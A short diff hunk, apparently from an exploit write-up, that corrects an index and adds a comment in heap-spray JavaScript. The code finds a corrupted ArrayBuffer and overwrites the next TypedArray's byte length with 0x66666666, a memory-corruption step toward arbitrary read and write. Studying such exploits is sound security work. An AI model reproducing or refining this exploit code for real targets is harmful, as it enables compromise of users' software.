@@ -271,7 +271,9 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
         if( sprayarr[i].byteLength == 0x20000-24){
             
             // This is the magic, overwrite the next TypedArray's byte length
-            var biga = new DataView(sprayarr[i1]);
+            var biga = new DataView(sprayarr[i]);
+
+            // offset to the byte length in the header
             biga.setUint32(0x10000-12,0x66666666);
 
             // +1 because the next reference as a corrupted length now.
